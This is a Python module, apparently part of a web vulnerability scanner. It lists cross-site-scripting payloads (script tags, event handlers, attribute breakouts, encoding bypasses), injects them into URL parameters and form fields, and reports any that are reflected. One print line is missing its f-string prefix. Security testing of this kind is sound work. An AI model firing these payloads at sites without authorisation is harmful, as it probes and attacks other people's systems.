from urllib.parse import urlsplit, urlencode, urlunsplit, parse_qs, urljoin
from utils import send_request
from bs4 import BeautifulSoup

XSS_PAYLOADS = {
    # Basic script injection
    "script_alert": '<script>alert("XSS")</script>',
    "script_prompt": '<script>prompt("XSS")</script>',
    # Event handlers
    "img_onerror": '<img src=x onerror=alert("XSS")>',
    "svg_onload": '<svg onload=alert("XSS")>',
    "body_onload": '<body onload=alert("XSS")>',
    "input_onfocus": '<input onfocus=alert("XSS") autofocus>',
    "details_ontoggle": '<details open ontoggle=alert("XSS")>',
    # Attribute breakout
    "double_quote_break": '" onmouseover="alert(\'XSS\')" "',
    "single_quote_break": "' onmouseover='alert(1)' '",
    # Protocol handlers
    "javascript_uri": 'javascript:alert("XSS")',
    "data_uri": 'data:text/html,<script>alert("XSS")</script>',
    # Encoding bypasses
    "html_entity": '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    "null_byte": '<scri%00pt>alert("XSS")</scri%00pt>',
    # Tag breaking
    "closing_tag": '"><script>alert("XSS")</script>',
    "closing_tag_single": "'/><script>alert('XSS')</script>",
}


def check_xss(url, cookies=None):
    print("[*] Checking the site for XSS vulnerability")

    response = send_request(url, cookies=cookies)

    check_url_xss(url, cookies)
    check_forms_xss(response, cookies)


def check_url_xss(url, cookies=None):
    parsed_url = urlsplit(url)

    existing_params = parse_qs(parsed_url.query)

    if not existing_params:
        print("[+] No parameters found in the URL")
        return

    for param_name in existing_params:
        for payload_name, payload in XSS_PAYLOADS.items():
            new_query = urlencode({param_name: payload})

            test_url = urlunsplit(
                (
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    new_query,
                    parsed_url.fragment,
                )
            )

            response = send_request(test_url, cookies=cookies)

            if response is None:
                print("[+] Skipping this URL")
                continue

            if payload in response.text:
                print(
                    f"[!] POTENTIAL XSS — param: '{param_name}' | payload: {payload_name}"
                )
                print(f"URL: {test_url}")


def check_forms_xss(response, cookies=None):
    soup = BeautifulSoup(response.text, "html.parser")

    forms = soup.find_all("form")

    skip_types = {"submit", "button", "image", "reset"}

    for form in forms:
        action = form.get("action", response.url)
        action = urljoin(response.url, action)
        method = form.get("method", "GET").upper()

        # Collect all inputs with their default values
        input_dict = {}
        injectable_fields = []

        inputs = form.find_all("input")

        for input_tag in inputs:
            input_name = input_tag.get("name")
            input_value = input_tag.get("value", "")
            input_type = input_tag.get("type", "text")

            if input_name:
                input_dict[input_name] = input_value

                if input_type not in skip_types and input_type != "hidden":
                    injectable_fields.append(input_name)

        if not injectable_fields:
            continue

        for field_name in injectable_fields:
            for payload_name, payload in XSS_PAYLOADS.items():
                test_data = input_dict.copy()
                test_data[field_name] = payload

                if method == "GET":
                    test_url = action + "?" + urlencode(test_data)
                    form_response = send_request(test_url, cookies=cookies)
                else:
                    form_response = send_request(
                        action, method, data=test_data, cookies=cookies
                    )

                if form_response is None:
                    continue

                if payload in form_response.text:
                    print(
                        f"[!] POTENTIAL XSS — form: '{action}' | field: '{field_name}' | payload: {payload_name}"
                    )
                    print("URL: {action}")
